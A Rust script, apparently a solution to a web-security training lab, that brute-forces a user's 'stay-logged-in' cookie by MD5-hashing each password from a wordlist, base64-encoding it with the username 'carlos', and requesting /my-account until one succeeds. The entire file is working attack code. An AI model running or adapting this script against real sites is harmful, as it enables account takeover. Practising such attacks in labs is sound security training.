/*******************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 29/8/2023
*
* Lab: Brute-forcing a stay-logged-in cookie
*
* Steps: 1. Hash every the password
*        2. Encrypt every tha hash with the username in the cookie
*        3. GET /my-account page with every encrypted cookie
*
********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use base64::Engine;
use regex::Regex;
use reqwest::{self, redirect::Policy, Client};
use std::{
    collections::HashMap,
    error, fs,
    io::{self, Write},
    thread,
    time::{self, Instant},
};
use text_colorizer::Colorize;

/*********************
* Async Main Function
**********************/
#[tokio::main]
async fn main() -> Result<(), Box<dyn error::Error>> {
    // change this to your lab URL
    let url = "https://0a4000dd04fa45f98333d3230000007a.web-security-academy.net"; 

    // build the client that will be used for all subsequent requests
    let client = build_client();
    
    // read passwords to one big string
    // change the path to passwords list
    let passwords = fs::read_to_string("/home/ahmed/passwords")?; 

    // capture the time before brute forcing
    let start_time = time::Instant::now(); 
    
    println!(
        "{} {}..",
        "[#] Brute frocing password of".white().bold(),
        "carlos".green().bold()
    );
    
    // iterate over the list
    for password in passwords.lines() {
        // compute the md5 hash of password
        let password_hash = format!("{:x}", md5::compute(password)); 
        
        // encrypt the hash with the username (base64)
        let cookie_encoded = base64::engine::general_purpose::STANDARD_NO_PAD
            .encode(format!("carlos:{password_hash}")); 
        
        // try to GET /my-account with the modified cookie
        let get_res = client
            .get(format!("{url}/my-account"))
            .header("Cookie", format!("stay-logged-in={cookie_encoded}"))
            .send()
            .await?; 

        // check the response status code
        match get_res.status().as_u16() { 
            200 => {
                // if you successfully logged in
                println!(
                    "\n{}: {}",
                    "✅ Correct pass".white().bold(),
                    password.green().bold()
                );
                break;
            }
            _ => {
                // the password is incorrect
                print!(
                    "\r{}: {:10} => {}",
                    "[*] Password".white().bold(),
                    password.blue().bold(),
                    "NOT Correct".red().bold()
                );
                io::stdout().flush();
            }
        }
    }
    print_finish_message(start_time);
    Ok(())
}

/**************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
***************************************************************/
fn build_client() -> Client {
    reqwest::ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(time::Duration::from_secs(60))
        .build()
        .unwrap()
}

/****************************************************
* Function used to print finish time
*****************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
